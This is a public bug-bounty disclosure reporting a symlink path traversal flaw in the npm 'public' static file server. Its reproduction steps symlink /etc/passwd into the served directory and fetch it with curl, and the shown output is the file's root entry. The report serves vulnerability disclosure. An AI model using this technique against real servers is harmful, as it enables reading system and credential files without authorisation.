# [public] Path traversal using symlink

## Report Details
- **Report ID**: 593911
- **URL**: https://hackerone.com/reports/593911
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-06-02T07:16:08.509Z
- **Disclosed**: 2019-08-28T09:00:44.926Z

## Reporter
- **Username**: henrychen
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report Path traversal vulnerability in public module



# Module

**module name:** public
**version:** 0.1.4
**npm page:** `https://www.npmjs.com/package/public`

## Module Description

Run static file hosting server with specified public dir & port. Support a "direcotry index" like Apache httpd.



## Module Stats

105 downloads in the last week


# Vulnerability

## Vulnerability Description

Path traversal using symlink.



## Steps To Reproduce:

+ Install public 
```
npm install public -g
```
+ Run public server

```
➜  public ./bin/public                 
Public.js server running with "/home/xxx/h1/node_modules/public" on port 3000
```
+ Create a symlink inside your project directory.

```
$ ln -s /etc/passwd test_passwd
```
+ Request the file with curl

```
$ curl http://127.0.0.1:3000/test_passwd
root:x:0:0:root:/root:/bin/bash
```
{F500825}

## Patch

providing a flag to disable/enable following symlinks.



## Supporting Material/References:

+ Ubuntu 16.04
+ node v11.8.0
+ npm 6.5.0


# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

It allows attacker to read content of arbitary file on remote server.

## Attachments
- 1.png
